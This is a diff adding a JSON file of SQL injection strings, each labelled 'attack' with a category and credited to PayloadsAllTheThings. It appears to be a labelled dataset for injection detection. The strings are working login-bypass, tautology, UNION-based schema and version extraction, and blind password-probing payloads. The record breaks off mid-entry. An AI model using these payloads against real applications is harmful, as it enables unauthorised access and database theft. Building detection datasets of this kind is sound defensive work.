@@ -1,0 +1,5918 @@
+[
+  {
+    "text": "'-'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' '",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'&'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'^'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'*'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or ''-'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or '' '",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or ''&'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or ''^'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or ''*'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"-\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" \"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"&\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"^\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"*\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"\"-\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"\" \"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"\"&\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"\"^\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"\"*\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or true--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or true--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or true--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or true--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or true--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 'x'='x",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('x')=('x",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "')) or (('x'))=(('x",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"x\"=\"x",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or (\"x\")=(\"x",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\")) or ((\"x\"))=((\"x",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or 1=1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or 1=1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or 1=1#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or 1=1/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' #",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin'/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' or '1'='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' or '1'='1'--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' or '1'='1'#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' or '1'='1'/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin'or 1=1 or ''='",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' or 1=1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' or 1=1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' or 1=1#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' or 1=1/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin') or ('1'='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin') or ('1'='1'--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin') or ('1'='1'#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin') or ('1'='1'/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin') or '1'='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin') or '1'='1'--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin') or '1'='1'#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin') or '1'='1'/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" #",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\"/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" or \"1\"=\"1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" or \"1\"=\"1\"--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" or \"1\"=\"1\"#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" or \"1\"=\"1\"/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\"or 1=1 or \"\"=\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" or 1=1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" or 1=1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" or 1=1#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\" or 1=1/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\") or (\"1\"=\"1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\") or (\"1\"=\"1\"--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\") or (\"1\"=\"1\"#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\") or (\"1\"=\"1\"/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\") or \"1\"=\"1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\") or \"1\"=\"1\"--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\") or \"1\"=\"1\"#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin\") or \"1\"=\"1\"/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1' or 1.e(1) or '1'='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
+    "label": "attack",
+    "category": "pat-Auth_Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "==",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "=",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' #",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' –",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" #",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' and 1='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' and a='a",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or true",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or ''='",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"\"=\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1′) and '1′='1–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" AND 1=0 UNION ALL SELECT \"\", \"81dc9bdb52d04dc20036dbd8313ed055",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and 1=1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and 1=1–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' and 'one'='one",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' and 'one'='one–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' group by password having 1=1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' group by userid having 1=1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' group by username having 1=1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "like '%'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or 0=0 --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or 0=0 #",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or 0=0 –",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or         0=0 #",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 0=0 --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 0=0 #",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 0=0 –",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 0=0 --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 0=0 #",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 0=0 –",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "%' or '0'='0",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or 1=1–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or '1'='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or '1'='1'--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or '1'='1'/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or '1'='1'#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or '1′='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1 --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1 –",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1;#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or '1'='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or '1'='1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or '1'='1'--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or '1'='1'/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or '1'='1'#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('1'='1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('1'='1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('1'='1'--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('1'='1'/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('1'='1'#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'or'1=1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'or'1=1′",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"1\"=\"1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"1\"=\"1\"--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"1\"=\"1\"/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"1\"=\"1\"#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 1=1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 1=1 --",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 1=1 –",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 1=1--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 1=1/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 1=1#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or 1=1–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or \"1\"=\"1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or \"1\"=\"1\"--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or \"1\"=\"1\"/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or \"1\"=\"1\"#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or (\"1\"=\"1",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or (\"1\"=\"1\"--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or (\"1\"=\"1\"/*",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or (\"1\"=\"1\"#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": ") or '1′='1–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": ") or ('1′='1–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1 LIMIT 1;#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'or 1=1 or ''='",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"or 1=1 or \"\"=\"",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 'a'='a",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or a=a--",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or a=a–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('a'='a",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or \"a\"=\"a",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or (\"a\"=\"a",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('a'='a and hi\") or (\"a\"=\"a",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 'one'='one",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 'one'='one–",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or uid like '%",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or uname like '%",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or userid like '%",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or user like '%",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or username like '%",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or ('x'='x",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' OR 'x'='x'#;",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'=' 'or' and '=' 'or'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' UNION ALL SELECT 1, @@version;#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' UNION ALL SELECT system_user(),user();#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' UNION select table_schema,table_name FROM information_Schema.tables;#",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "admin' and substring(password/text(),1,1)='7",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' and substring(password/text(),1,1)='7",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or 1=1 limit 1 -- -+",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'=\"or'",
+    "label": "attack",
+    "category": "pat-Auth_Bypass2",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 1=1",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 1=0",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR x=x",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR x=y",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 1=1#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 1=0#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR x=x#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR x=y#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 1=1--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 1=0--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
